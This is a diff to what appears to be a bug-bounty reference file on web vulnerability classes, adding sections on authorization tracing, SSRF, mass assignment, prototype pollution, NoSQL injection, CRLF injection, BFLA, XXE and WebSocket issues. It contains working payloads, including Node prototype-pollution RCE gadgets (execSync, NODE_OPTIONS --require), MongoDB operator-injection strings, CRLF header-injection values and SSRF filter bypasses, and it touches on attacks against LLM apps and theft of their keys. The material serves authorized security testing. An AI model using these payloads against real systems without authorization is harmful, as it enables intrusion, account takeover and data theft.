@@ -1,9 +1,9 @@
 ---
 name: web2-vuln-classes
-description: Complete reference for 26 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass, XSS (postMessage), SSRF (11 IP bypass techniques), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10, MCP/RAG attacks), API misconfig (mass assignment, JWT, prototype pollution, CORS), ATO (9 paths), SSTI, subdomain takeover, cloud misconfig, HTTP smuggling, cache poisoning, MFA bypass (7 patterns), SAML attacks, error disclosure, CSS injection, LFI/RCE, insecure deserialization, dependency confusion, padding oracle. Use when hunting a specific vuln class or studying what makes bugs pay.
+description: Complete reference for 32 web2 bug classes with root causes, detection patterns, bypass tables, exploit techniques, and real paid examples. Covers IDOR, auth bypass (with a backward-taint "sufficient guard" procedure per horizontal/vertical/context category and an authz-specific false-positive list), XSS, SSRF (11 IP bypass techniques, plus a sink taxonomy by mechanism/outcome and a 7-step checklist), SQLi, business logic, race conditions, OAuth/OIDC, file upload (10 bypass techniques), GraphQL, LLM/AI (ASI01-ASI10 agentic framework), API misconfig (mass assignment with ORM-specific bypasses, JWT attacks, prototype pollution with Node RCE gadgets, CORS), ATO taxonomy (9 paths), SSTI (Jinja2/Twig/Freemarker/ERB/Spring), subdomain takeover, cloud/infra misconfigs, HTTP smuggling (CL.TE/TE.CL/H2.CL), cache poisoning, MFA bypass (7 patterns), SAML attacks (XSW/comment injection/signature stripping), error disclosure / debug endpoints (stack trace regex per framework, chain templates), CSS injection (attribute-selector exfiltration, opacity clickjacking, @import), LFI / file inclusion -> RCE (php://filter source disclosure, iconv filter-chain RCE with no upload, log/environ poisoning, .user.ini/.htaccess auto_prepend, data:// + expect:// wrappers, session inclusion, traversal bypass table), insecure deserialization (PHP __wakeup bypass / phar:// POP chains, Java ysoserial CommonsCollections gadgets + magic bytes, Python pickle __reduce__ + signed-cookie forgery, Node node-serialize), broken function-level authorization (BFLA — actor x action matrix, transport/verb drift, gateway header trust), NoSQL injection (MongoDB operator injection + $where/$function SSJS, Redis/Elasticsearch/DynamoDB/Cassandra/CouchDB/Neo4j), semantic confusion (parser/normalization differentials, Spring4Shell-class field overloading), header injection / response splitting (CRLF, mail header injection), XXE (injection-point inventory + escalation chain, payloads cross-referenced to security-arsenal), WebSocket security (CSWSH, auth-once-trust-forever message handling), dependency confusion / supply chain (callback-only PoC discipline, npm/pip/Maven/RubyGems variants), padding oracle & crypto misuse (PadBuster, ASP.NET ViewState-to-RCE, ECB/weak-hash quick wins). Use when hunting a specific vuln class or studying what makes bugs pay.
 ---
 
-# WEB2 BUG CLASSES — 26 Classes
+# WEB2 BUG CLASSES — 32 Classes
 
 Root cause, pattern, bypass table, chaining opportunity, real paid examples.
 
@@ -20,6 +20,15 @@ Root cause, pattern, bypass table, chaining opportunity, real paid examples.
 > The MFA workflow-skip and SAML signature-stripping probes intentionally
 > stay **unauthenticated** even when a session is loaded — that's the
 > attack premise.
+>
+> **Session context** — when a target has more than two roles (free/paid
+> tiers, org owner/member/guest, multiple tenant accounts), keep a running
+> map as you go: which identity you're using, which endpoints it reached,
+> what data/actions came back. Update it every time you discover a new
+> role or endpoint, don't rebuild it from scratch per bug class — the map
+> from your XSS pass is the same map your IDOR pass needs, and a gap you
+> notice in it ("I never tried the guest role against `/api/export`") is
+> itself a lead.
 
 ---
 
@@ -64,6 +73,21 @@ def get_order(order_id):
 [ ] Check WebSocket messages for client-supplied IDs
 ```
 
+### Proof Bar for Single-Session ID-Walking
+
+A faster variant of the two-account test above, when you only have one
+account: walk 2+ sequential/adjacent IDs under that single session and
+check whether the responses come back 200. **A 200 status alone proves
+nothing** — you're the one making the request, so a 200 could just be your
+own record echoed back regardless of the ID you sent. The actual proof bar
+is **distinct identity-field values across the IDs** — different
+email/username/name/address in each 200 response. Two or more genuinely
+different people's data readable from one session is what makes this
+`confirmed`; fewer than two distinct records is `open_proof_gap` (the app
+may be correctly returning only your own data, or denying the others) —
+don't round that up to a finding, and don't round it down to "safe" either
+without checking the response bodies actually differ.
+
 ### IDOR Chain Escalation
 - IDOR + Read PII = Medium
 - IDOR + Write (modify other's data) = High
@@ -101,6 +125,71 @@ if (user.role === 'admin') showAdminButton();
 ### Real Paid Examples
 - **HackerOne TrustHub**: `POST /graphql` with `TrustHubQuery` — no auth, regular user reads all vendors (CVSS 8.7 High)
 - **Vienna Chatbot**: WebSocket `get_history` accepts arbitrary UUID — no ownership check (P2)
+
+### Authorization Backward-Taint Procedure
+
+Don't just check whether *a* guard exists — check whether it's the *right kind*
+of guard for the category of access you're testing, and whether it runs
+before the effect it's supposed to prevent. This is a backward trace from the
+sink (the DB write, the file read, the privileged action) back to whatever
+check sits in front of it, not a forward crawl of routes.
+
+**"Sufficient guard" criteria, by category — all must hold, not just one:**
+
+| Category | Sufficient guard requires |
+|---|---|
+| Horizontal (user A vs. user B, same privilege level) | Ownership binding (`WHERE user_id = current_user.id`, not just `WHERE id = ?`) **AND** tenant/org filtering on multi-tenant data **AND** isolation of any shared service the object passes through (a shared cache, search index, or notification service must also scope by owner) |
+| Vertical (low-priv vs. admin/elevated role) | Server-side role check on the actual mutation/query handler — not a client-side conditional, not a check on a *different* endpoint that merely fronts the same action |
+| Context/workflow (step order, state machine) | The check validates the *current* state transition is legal for *this* actor — not just that the actor is authenticated, and not just that *some* prior step in the workflow happened |
+
+**Side effect, defined:** any state change or data exposure the request causes
+— a DB write, a cache populate, an email/webhook fired, a file written, a
+downstream service call. When you're tracing whether a guard is sufficient,
+trace it against every side effect the endpoint has, not just the primary
+one advertised by its name (a "read" endpoint that also logs the full object
+to an unscoped audit trail has a second side effect worth checking).
+
+**Hard rule — a guard after the sink doesn't count.** If the ownership/role
+check runs *after* the query has already executed, the file has already been
+opened, or the response has already been partially built, it is not a
+guard — it's dead code or a broken fix. This is the same "ordering bug, not a
+control" principle from `triage-validation`'s closure discipline, applied
+specifically to authz: locate the exact line the check runs on and the exact
+line the effect happens on, and confirm the ordering, don't assume it from
+the check merely being present somewhere in the function.
+
+**Confidence — round down when uncertain.** If you can't fully trace whether
+a guard is sufficient (a call goes into a compiled dependency, a
+feature-flagged code path you can't toggle, a microservice you don't have
+source for), score your confidence at the *lower* of the two possibilities,
+not the higher one. An authz finding you're not sure about is an
+`open_proof_gap`, not a `confirmed` with an optimistic guess attached.
+
+**Authz-specific false-positive list** — each of these looks like a finding
+and isn't:
+
+- **UI-only checks mistaken for authz.** A disabled button or hidden nav item
+  is not a control — always test the underlying request directly with the
+  UI bypassed.
+- **Confusing authn with authz.** "This endpoint has no login requirement" is
+  a different bug (missing authentication) from "this logged-in user can
+  reach another user's data" (missing authorization) — don't conflate the
+  two in your writeup; they have different severity and different fixes.
+- **Shared-service tenant leakage assumed present without checking.** Don't
+  assume a shared cache/search/notification layer leaks across tenants just
+  because the primary DB query is correctly scoped — and don't assume it's
+  *safe* either. Trace it explicitly; this is exactly the kind of check the
+  Horizontal row above calls out.
+- **Indirect access via a related object treated as out of scope.** If
+  `/api/orders/:id` is correctly scoped but `/api/orders/:id/invoice` or
+  `/api/orders/:id/shipment` isn't, that's still the same root cause reaching
+  a second sink — report each reachable instance, don't stop at the first
+  one you found guarded correctly.
+
+Feed a confirmed candidate into `triage-validation`'s `confirmed` /
+`ruled_out` / `open_proof_gap` discipline as normal — this procedure is how
+you decide which bucket an authz candidate belongs in, not a replacement for
+that discipline.
 
 ---
 
@@ -261,6 +350,56 @@ http://localhost:8080     # Admin panel
 - Cloud metadata + exfil keys = Critical
 
 **WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `tools/waf_encoder.py "<payload>" --class generic`.
+
+### SSRF Sink Taxonomy
+
+Classify by **mechanism** (how attacker-controlled data reaches the outbound
+request) — this tells you where to inject:
+
+| Mechanism | Where it lives | Example |
+|---|---|---|
+| URL_Manipulation | Direct URL parameter | `?url=`, `?src=`, `?image=` |
+| Redirect_Abuse | App follows a redirect from a URL it fetched | Attacker's URL 302s to internal target after the allowlist check already passed |
+| Webhook_Injection | User-configured callback/webhook URL | Integrations, notification settings, CI/CD webhook config |
+| API_Proxy_Bypass | App proxies a request on the user's behalf | "Fetch preview," "test this endpoint," PDF/screenshot renderers |
+| File_Fetch_Abuse | App fetches a remote file by URL | Avatar/import-from-URL, "attach from link" |
+| Service_Discovery | App resolves/calls internal service names | Microservice mesh where a service name/ID is user-influenced |
+
+Classify by **outcome** — this tells you what you can prove and how to score
+it:
+
+| Outcome | What you observe | Evidence needed |
+|---|---|---|
+| Reflected | Response body contains the fetched content | Full response body in the report — internal service banner, metadata JSON, etc. |
+| Stored | Fetched content is saved and rendered later (thumbnail, cached preview, indexed doc) | Show the stored artifact rendering the internal content on a later, unrelated request |
+| Blind | No content returned, but a callback confirms the request fired | Interactsh/Collaborator DNS **and** HTTP hit — DNS-only is Informational per the bypass table below |
+| Semi-blind | No content returned, but response *timing* or *status code* differs based on whether the internal target exists/responds | Timing diff or status-code diff between a live internal port and a closed one — document both data points |
+
+**7-step checklist** (run in order — each step narrows what's actually
+blocked before you invest time bypassing it):
+
+```
+[ ] 1. Protocol allowlist — is the app restricted to http(s), or does it also
+       accept file://, gopher://, dict://, ftp://? Try each.
+[ ] 2. Private-IP / CIDR block — is 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12,
+       192.168.0.0/16, 169.254.0.0/16 actually blocked, or just 127.0.0.1
+       literally? Use the IP bypass table above against each range.
+[ ] 3. DNS rebinding — does the app resolve once (allowlist check) and fetch
+       again later (TOCTOU), or resolve+fetch atomically? Test with a DNS
+       record that flips between an allowed and internal IP on each lookup.
+[ ] 4. Cloud-metadata-IP blocking — is 169.254.169.254 specifically
+       blocklisted, or does it fall through the general private-IP block
+       (and can it be bypassed the same way)?
+[ ] 5. Port restriction — is the app restricted to 80/443, or can it hit
+       arbitrary ports (Redis 6379, Elasticsearch 9200, Docker API 2375)?
+[ ] 6. Header-stripping on proxied requests — when the app fetches a URL on
+       your behalf, does it forward YOUR headers (Authorization, Cookie) to
+       the internal target, potentially leaking your session internally, or
+       strip them (safer, but check anyway)?
+[ ] 7. Response classification — reflected/stored (full read), blind
+       (DNS+HTTP collaborator hit), or semi-blind (timing/status diff only)
+       — this determines both your evidence and your severity claim.
+```
 
 ---
 
@@ -664,7 +803,7 @@ Leaking the system prompt is **Informational on its own** — escalate only if i
 The model's plumbing leaks its own credentials and provider config — directly monetizable (LLMjacking: stolen keys run up the victim's inference bill) and a pivot into the victim's cloud.
 
 - **Where keys leak:** system-prompt extraction (above); client-side JS bundles / source maps (`grep -RniE 'sk-[A-Za-z0-9]{20,}|sk-ant-|AIza[0-9A-Za-z_-]{35}|hf_[A-Za-z0-9]{30,}|AKIA[0-9A-Z]{16}'` over the recon JS — also run `/secrets-hunt --js-bundle`); verbose error/debug endpoints (see Error Disclosure / Debug Endpoints); a `fetch`/`http` MCP tool coerced into hitting the provider's local proxy or `169.254.169.254` (see SSRF class).
-- **Verify before claiming impact (don't run up the victim's bill):** a single low-cost `models.list`/balance call proves the key is live; `git-dumper` an exposed `.git` to recover keys from history. LLMjacking via leaked cloud creds (e.g. AWS Bedrock-hosted models) has been observed costing victims tens of thousands of dollars/day — cite the *pattern*, not a fabricated number.
+- **Verify before claiming impact (don't run up the victim's bill):** a single low-cost `models.list`/balance call proves the key is *accepted* — but that alone doesn't prove it's actually being checked, since some endpoints answer 200 regardless. Add the matched-twin control from `rules/hunting.md` Rule 17: corrupt a few middle characters of the same key (never the `sk-`/provider prefix) and confirm that copy gets rejected. Real-accepted + twin-rejected is the proof; `git-dumper` an exposed `.git` to recover keys from history. LLMjacking via leaked cloud creds (e.g. AWS Bedrock-hosted models) has been observed costing victims tens of thousands of dollars/day — cite the *pattern*, not a fabricated number.
 - **Submittable when:** key is live and belongs to the target (or its provider account). A revoked/demo key = N/A. Mirrors the Hugging Face leaked-token disclosures (1,600+ live tokens found in public repos) — chase the *target's* keys, not third parties'.
 
 ---
@@ -674,6 +813,51 @@ The model's plumbing leaks its own credentials and provider config — directly 
 ### Mass Assignment
 ```javascript
 User.update(req.body)  // body has {"role": "admin"} → privilege escalation
+```
+
+**Sensitive-field dictionary** — fuzz these alongside the legitimate update body, not instead of it:
+```
+role, isAdmin, permissions[], status, plan, tier, premium, verified, emailVerified
+userId, ownerId, accountId, organizationId, tenantId, workspaceId
+usageLimit, seatCount, maxProjects, creditBalance
+features[], flags[], betaAccess, allowImpersonation
+price, amount, currency, prorate, nextInvoice
+```
+
+**Shape variants that bypass a field-name allowlist:**
+```
+Nested/bracket paths:   profile.role   profile[role]   settings[roles][]
+Duplicate keys:         {"role":"user","role":"admin"}  (last-wins in most JSON parsers)
+Content-type switch:    application/json vs x-www-form-urlencoded vs multipart vs text/plain
+                        — some validators only inspect one content-type
+Batch/bulk endpoints:   per-item allowlist enforcement often skipped inside an array POST
+JSON Patch / Merge:     add a forbidden path via {"op":"replace","path":"/role","value":"admin"}
+```
+
+**Framework-specific edges:**
+```
+Rails      strong parameters misconfigured, or accepts_nested_attributes_for reaches a nested writable model
+Laravel    $guarded = [] opens every field; $fillable missed on a nested relation
+Django REST Framework  writable nested serializer, read_only/extra_kwargs gap on one field
+Mongoose/Prisma        select:false hides a field from reads but doesn't block writes to it
+```
+
+### Testing Checklist
+```
+[ ] Capture the normal update response — build the field candidate list from what's returned
+[ ] Inject one sensitive field at a time alongside the legitimate body, diff before/after state
+[ ] Repeat across JSON / form-encoded / multipart for the same endpoint
+[ ] Try nested/bracket shape variants if the flat field name is rejected
+[ ] Test batch/array endpoints — smuggle one malicious object inside a large legitimate batch
+[ ] GraphQL: try the same field names in mutation input types, then re-query immediately to see if it stuck even if the mutation response filters it out
+```
+
+### Chain Escalation
+```
+role/isAdmin in signup or profile-update body -> persists            Critical (priv-esc)
+ownerId/tenantId field on an update reaches the DB write unchecked   Critical (cross-tenant takeover)
+plan/price/creditBalance writable on checkout/update endpoint        High (billing fraud)
+Field visible in response but server recomputes it server-side       N/A — not mass assignment, it's read-only
 ```
 
 ### JWT None Algorithm
@@ -697,6 +881,61 @@ token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256"
 {"__proto__": {"admin": true}}
 {"constructor": {"prototype": {"admin": true}}}
 // URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
+```
+
+**Where it lives:** any deep merge/extend/defaults on user-controlled JSON —
+`lodash.merge`, `lodash.defaultsDeep`, `deep-extend`, jQuery `$.extend`,
+hand-rolled recursive `Object.assign` loops, `qs`/`body-parser` nested
+bracket-notation query strings, or `yaml.load()` (not the safe variant).
+
+**Canary-first testing (don't jump straight to gadgets):**
+```json
+{"__proto__": {"pollutionCanary_<random>": "yes"}}
+```
+Confirm the canary actually lands on `Object.prototype` (e.g. a follow-up
+request reads an unrelated object and the canary property is present) before
+investing time in exploitation. A key that's merely echoed back in the
+response was never actually merged into the prototype.
+
+**Filter bypasses when `__proto__` alone is stripped:**
+```
+constructor[prototype][isAdmin]=true      # nested-form bypass
+__proto__[0]  /  [].__proto__.key         # array-form bypass
+Content-type switch (JSON <-> form <-> multipart) reaches a different parser
+Split the pollution across two sequential requests merged into the same object
+```
+
+**Node.js RCE gadget chains** (version-specific — confirm the package version
+before claiming RCE, e.g. via an exposed `package-lock.json`/`node_modules`
+listing or error stack trace):
+```json
+{"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /tmp/evil.js"}}
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//"}}
+```
+`ejs`/`pug` `outputFunctionName`, and `child_process` `shell`/`NODE_OPTIONS`
+are the classic sinks — check `node_modules` in white-box scope for known
+gadget-bearing versions before spending time hunting blind.
+
+**Client-side impact:** a polluted `isAdmin`/config default read by an
+`if (user.isAdmin)` check, or fed into `innerHTML`/`document.write`/a script
+loader → DOM XSS. Test whether pollution survives page reload (persisted
+default) or is scoped to one page load only.
+
+### Testing Checklist
+```
+[ ] Send the canary payload first — confirm it lands on the prototype, not just echoed
+[ ] Try __proto__, constructor.prototype, and array-form (__proto__[0]) — sanitizers often strip only one
+[ ] Test JSON body, URL-encoded bracket notation, and multipart for the same endpoint
+[ ] White-box: grep node_modules for merge/extend/defaultsDeep + user input; match gadget to installed version
+[ ] Confirm impact behaviorally — auth bypass, XSS execution, or RCE — not just a polluted key visible in a response echo
+```
+
+### Chain Escalation
+```
+Canary confirmed on Object.prototype + isAdmin gadget read downstream        High (auth bypass)
+Confirmed pollution + known Node gadget (ejs/pug/child_process) on classpath  Critical (RCE)
+Client-side pollution + innerHTML/document.write sink                        High (DOM XSS)
+Canary lands but no reachable gadget found                                   Info — pollution confirmed, impact not yet proven; keep hunting for a sink before reporting
 ```
 
 ### CORS Exploitation
@@ -1573,19 +1812,539 @@ __wakeup-bypassed PHP object reaching __toString file read (no command exec)    
 Deserialization sink confirmed but NO gadget on classpath / blind w/ no OOB proof  N/A — not submittable until you land code exec or OOB callback
 ```
 > Deserialization is one of the few classes where a single request is plausibly Critical — but **only with a working PoC**. A `rO0AB` blob or an `unserialize()` grep hit with no demonstrated gadget execution is N/A. Land OOB (Collaborator/interactsh callback) or command output, or kill it. Where the encrypted blob also leaks a padding oracle, see the Padding Oracle & Crypto Misuse class for the ViewState/forge-the-blob path.
-## 25. DEPENDENCY CONFUSION / SUPPLY CHAIN  📦
+
+---
+
+## 25. BROKEN FUNCTION-LEVEL AUTHORIZATION (BFLA)
+> Distinct from IDOR: IDOR is "which *object* can I reach" — BFLA is "which *action* can I invoke." A user with zero admin objects to steal can still have BFLA if they can call the admin *endpoint* itself.
+
+### Root Cause
+```javascript
+// VULNERABLE — endpoint checks auth, never checks role/action entitlement
+router.post('/api/users/:id/promote', requireAuth, (req, res) => {
+  db.users.update({ id: req.params.id }, { role: 'admin' });  // any logged-in user can call this
+});
+
+// SECURE
+router.post('/api/users/:id/promote', requireAuth, requireRole('admin'), handler);
+```
+
+### Variants
+- **Transport drift:** action blocked in the web UI/REST route, but the same backend method is reachable via a GraphQL mutation, gRPC (reflection-enabled), or an internal WebSocket event with weaker checks
+- **Verb/method drift:** `GET /admin/users/:id` requires role, `DELETE /admin/users/:id` doesn't
+- **Gateway header trust:** edge proxy injects `X-User-Role: admin` after its own check; backend trusts the header instead of re-deriving the role from the token
+- **Legacy/alias route:** `/api/v1/admin/*` missing the auth middleware chain that `/api/v2/admin/*` has
+- **Background job / webhook finalize:** job *creation* checks role, job *finalize/approve* (triggered by a worker or webhook replay) does not re-check the actor
+- **Feature-flag-only enforcement:** admin action hidden by a UI flag but the endpoint itself has no server-side check — call it directly with a basic-tier token
+
+### Testing Checklist
+```
+[ ] Build an Actor x Action matrix: unauth, basic, premium, staff/admin tokens x every discovered action
+[ ] Call every "admin-only" action with a basic-tier token directly (skip the UI) — REST, GraphQL, gRPC if present
+[ ] Try method overrides: GET vs POST vs PUT vs DELETE vs PATCH on the same route, and X-HTTP-Method-Override
+[ ] Try legacy/versioned route aliases for the same action (/v1/ vs /v2/, /admin/ vs /internal/)
+[ ] Replay/finalize a job or webhook created by another actor — does the finalize step re-check identity?
+[ ] Vary only the role/org header while keeping the same token — does the backend trust the header over the token claim?
+```
+
+### Real Paid Examples
+- Widely reported pattern on H1/Bugcrowd: an admin promote/impersonate/refund mutation reachable via GraphQL with a low-privilege token when the equivalent REST route is properly gated — the REST-only gate is the giveaway that authorization lives in the route handler, not the service layer.
+- Gateway-injected identity header trust (`X-User-Id`/`X-Role`) is a recurring internal-microservices finding once an attacker can reach the backend service directly (via SSRF, an exposed internal load balancer, or a misrouted path) and supply their own header.
+
+### Chain Escalation
+```
+Basic-tier token invokes an admin mutation directly (GraphQL/gRPC bypass)     Critical (priv-esc, full admin action)
+Gateway header trust + SSRF reaching the backend directly                    Critical (auth bypass at the network layer)
+Job/webhook finalize endpoint skips actor re-check                            High (approve/refund/state-change as another actor)
+Feature-flag-hidden action has no server-side check, but is low-impact        Medium — same bug, lower ceiling
+UI button removed but backend genuinely re-checks role server-side            N/A — that's a UX gap, not BFLA
+```
+
+---
+
+## 26. NOSQL INJECTION
+
+### Root Cause
+```javascript
+// VULNERABLE — Express + Mongoose, raw JSON body straight into the query
+db.users.findOne({ username: req.body.username, password: req.body.password });
+// body: {"username":{"$ne":null},"password":{"$ne":null}}  -> matches first user, any password
+
+// SECURE — cast to string before querying, or use a strict schema
+db.users.findOne({ username: String(req.body.username), password: String(req.body.password) });
+```
+
+### Injection Shapes (try both — different middleware handles them differently)
+```
+JSON body:    {"username":{"$ne":null},"password":{"$ne":null}}
+Form/bracket: username[$ne]=x&password[$ne]=x         (Express body-parser / PHP coerce this to an operator object)
+```
+
+### Operator Cheat Sheet (MongoDB — the dominant target)
+```
+$ne, $gt, $exists:false        auth bypass — matches any/first document
+$regex                          blind character-by-character extraction: {"password":{"$regex":"^a"}}
+$where                          server-side JS execution (default-on pre-7.0, including 4.4–6.x unless explicitly disabled)
+$expr + $function               server-side JS inside aggregation pipelines (MongoDB 4.4+), reachable even when $where is filtered
+$lookup.from (user-controlled)  pivots the query to an unintended collection — e.g. orders -> users
+```
+
+### Other Stores (same operator/structure-injection root cause)
+```
+Redis          f"SET {key} {value}" string concat -> inject \r\n to smuggle extra commands (RESP injection)
+Elasticsearch  query_string=* or role:admin via Lucene syntax; _update scripts if source is user-controlled
+DynamoDB       PartiQL string concat -> ' OR '1'='1
+Cassandra      CQL string concat -> ' OR '1'='1' ALLOW FILTERING --  (no SLEEP/OOB primitive — boolean/error-based only)
+CouchDB        _find Mango selectors accept the same {"$gt":""} shapes as MongoDB
+Neo4j          Cypher string concat -> UNION MATCH (u:User) RETURN u; apoc.load.json = SSRF if apoc unrestricted
+```
+
+### Testing Checklist
+```
+[ ] Send {"field":{"$ne":null}} in JSON body against login/search/reset-token-lookup endpoints
+[ ] Send field[$ne]=x in form-encoded body against the same endpoints — different parser, different result
+[ ] If auth bypass works, confirm with a second distinct operator ($gt, $regex) to rule out coincidence
+[ ] Blind-extract a real secret (reset token, API key) via $regex, not just the password
+[ ] GraphQL: submit operator objects as mutation/query variables on any input type that reaches a NoSQL filter
+[ ] Fingerprint SSJS before investing in $where/$function payloads: db.adminCommand({getParameter:1, javascriptEnabled:1})
+```
+
+### Chain Escalation
+```
+{"$ne":null} on login body -> authenticates as first/any user           Critical (auth bypass)
+$regex blind extraction of a reset token or API key                     Critical (ATO / key theft)
+$lookup.from pivots into a different tenant's collection                 High (cross-tenant data exfil)
+$where / $function server-side JS execution confirmed                    Critical (RCE-adjacent, full query engine control)
+Operator object rejected — input cast to string before query             N/A — not exploitable, framework casts protect it
+```
+
+---
+
+## 27. SEMANTIC CONFUSION — PARSER & NORMALIZATION DIFFERENTIALS
+> Not "is input validated" but "do the validator and the final consumer agree on what this input *means*." A value can be safe under one representation and dangerous after a later decode/normalize/fallback the validator never saw.
+
+### Root Cause
+```
+security_check(value_A)  ->  ...  ->  sink(transform(value_A))
+```
+The bug lives in the gap: the check ran against one representation, the sink acted on a different one. A well-documented real-world instance is **Spring4Shell (CVE-2022-22965)**: Spring's data binder let a request parameter reach `class.module.classLoader` — the framework's parameter-binding layer and the security-relevant object graph disagreed on what a "field name" was allowed to reach, and that disagreement was RCE.
+
+### High-Value Confusion Classes
+```
+Parser differential    Same bytes parsed differently by proxy vs framework vs backend
+                        (duplicate headers, comma-joined values, first-match vs last-match)
+Normalization drift     Percent-decode count, Unicode normalization, slash/backslash handling,
+                        dot-segment removal happen at one layer but not the one that checks auth
+Field/type overloading  A shared field means two things to two readers — filename vs URL,
+                        content-type vs handler-selector, display name vs executable name
+Lifecycle/state drift   An error path that should stop processing doesn't; stale data from
+                        one request carries into a retry, subrequest, or cached response
+Namespace/PATH fallback A missing local binary silently falls back to a public package/registry
+                        (e.g. npx/npm exec bare-command fallback — check package identity vs bin name)
+```
+
+### Differential Test Matrix (change ONE axis per test)
+```
+Encoding:   raw / single-encoded / double-encoded / mixed-case / malformed Unicode
+Structure:  duplicate header/param, comma-joined, empty value, quoted, trailing comment
+Path:       / vs \ vs // vs dot-segments vs absolute vs sibling-prefix collision
+Transport:  HTTP/1.1 vs HTTP/2, chunked vs fixed-length body, direct-origin vs behind CDN/WAF
+```
+
+### Testing Checklist
+```
+[ ] Capture a clean baseline (raw bytes) before mutating anything
+[ ] Change exactly one axis per request — isolate which layer disagrees, don't spray everything at once
+[ ] Diff status/headers/body/cache state between direct-origin and behind-CDN/WAF requests
+[ ] For a prefix allowlist, test a sibling that shares the prefix textually but not as a path segment
+    (e.g. allowed=/api/public, test /api/public-admin/x)
+[ ] Prove BOTH interpretations: show what the security check saw, and what the sink actually consumed
+```
+
+### Chain Escalation
+```
+WAF/edge sees one path, origin resolves a different one                    High/Critical (auth bypass to protected route)
+Parameter-binding reaches an object graph the developer never scoped (Spring4Shell-class)   Critical (RCE)
+Duplicate header disagreement between proxy and backend                     High (request smuggling — see class 17)
+Difference visible only in logs, same security decision either way          N/A — no security consumer disagrees
+```
+
+---
+
+## 28. HEADER INJECTION / RESPONSE SPLITTING
+
+### Root Cause
+```python
+# VULNERABLE — user input reflected raw into a response header
+response.headers['Location'] = f"/profile?name={request.args['name']}"
+# name = "x%0d%0aSet-Cookie:%20session=attacker"  -> injects a second header into the response
+
+# SECURE — reject/strip CR/LF, use a framework header API that rejects control characters
+```
+
+### Where It Shows Up
+```
+Redirect targets echoed into Location             CRLF -> smuggle Set-Cookie or a full second response (splitting)
+"Remember me"/locale/theme values echoed into a header
+Reflected values in caching-relevant headers      same root cause as class 18 (Cache Poisoning), different sink
+X-Forwarded-Host / X-Forwarded-For reflected into a response header or outbound request
+Mail headers: To/CC/Subject built from user input -> SMTP header injection -> arbitrary recipient/BCC
+```
+
+### Bypass Techniques
+```
+Raw CRLF filtered?       try %0d%0a, %0D%0A, raw \r\n, and bare \n (some parsers accept LF-only)
+Encoding layers          double-encode (%250d%250a) if a proxy decodes once before the app
+Unicode line separators  U+2028/U+2029 accepted by some header-writing libraries as a line break
+```
+
+### Testing Checklist
+```
+[ ] Identify every user-controlled value reflected into a response header (not just Location)
+[ ] Inject %0d%0a followed by a new header name — confirm it appears as a distinct header in the raw response
+[ ] If a cookie can be injected, prove session fixation or an auth-relevant flag flip (not just an extra harmless header)
+[ ] If full response splitting is achieved (a second HTTP response body), check for cache poisoning impact (class 18)
+[ ] Mail-header injection: try injecting Bcc/Cc into a contact-form or invite-email field
+```
+
+### Chain Escalation
+```
+CRLF -> injects Set-Cookie with attacker session value              High (session fixation)
+Full response splitting -> cached by a shared cache                 Critical (stored XSS at scale, see cache poisoning class)
+CRLF into outbound mail headers -> Bcc injection                    Medium/High (mail spoofing, spam relay via target's domain)
+Header reflected but framework strips CR/LF at the header-writer layer   N/A
+```
+
+---
+
+## 29. XXE — XML EXTERNAL ENTITY
+
+> Payload library (classic file-read, blind OOB via HTTP, blind OOB+exfil via
+> parameter entities) lives in `security-arsenal` — this section is about
+> *where to find the injection point and how to escalate*, not the payloads
+> themselves.
+
+### Root Cause
+```python
+# VULNERABLE — external entity resolution left on (most XML libraries
+# default this OFF in current versions; the bug shows up in older
+# libraries, SOAP toolkits, or DOCX/XLSX/PDF generators bundled as a
+# dependency that predates the safe default)
+parser = etree.XMLParser(resolve_entities=True)  # or no DTD-disabling call at all
+
+# SECURE
+parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
+```
+
+### Where XML Actually Gets Parsed (the injection points)
+```
+Any endpoint that accepts Content-Type: application/xml or text/xml directly
+SOAP API endpoints (WSDL-described services, legacy enterprise integrations)
+SAML assertions / metadata (see ATO taxonomy + SAML class — same primitive, different sink)
+Office document uploads — DOCX/XLSX/PPTX are ZIPs containing XML parts
+SVG file upload (also an XSS vector — see File Upload class)
+RSS/Atom feed import ("subscribe to a feed," content syndication)
+XML-RPC endpoints
+Config/data import features that accept XML alongside JSON/CSV
+GraphQL or REST APIs that internally convert XML input for a legacy backend
+```
+A "modern framework, so XXE isn't possible" assumption is exactly the kind
+of thing `triage-validation`'s closure discipline warns against — the
+default may be safe for the *primary* JSON API and still be unsafe in a
+bundled document-generation or legacy-integration library reachable from a
+different endpoint.
+
+### Detection
+```
+1. Send the classic file-read payload (security-arsenal) — look for file
+   content reflected in the response.
+2. No reflection? Switch to blind OOB — a DNS/HTTP callback (Interactsh/
+   Collaborator) on the entity's SYSTEM URL confirms the parser resolves
+   external entities even with no visible output.
+3. Still nothing but you suspect the parser resolves entities silently?
+   Use the parameter-entity + OOB-exfil chain (security-arsenal) to smuggle
+   file contents out via a subdomain/query string on your own listener.
+4. Upload-based surfaces (DOCX/SVG): repackage the file with a malicious
+   XML part, re-zip, upload — confirm via the same OOB listener.
+```
+
+### Impact Chain
+```
+File read only (e.g. app config, source)                          High
+SSRF via file:// -> http:// SYSTEM URL hitting internal services   High/Critical (see SSRF class)
+Cloud metadata reachable via XXE-driven SSRF                       Critical
+Billion Laughs / quadratic blowup (entity expansion DoS)           Medium (app-level DoS)
+DTD fully disabled at the parser, no bypass found                  N/A
+```
+
+---
+
+## 30. WEBSOCKET SECURITY
+
+> WebSocket as an **IDOR vector** (client-supplied IDs inside a message) is
+> already covered under IDOR class §1 V8 — this section covers the
+> connection-level issues specific to WebSocket that aren't an IDOR variant.
+
+### Cross-Site WebSocket Hijacking (CSWSH)
+The WebSocket handshake is a plain HTTP GET with an `Upgrade` header — it
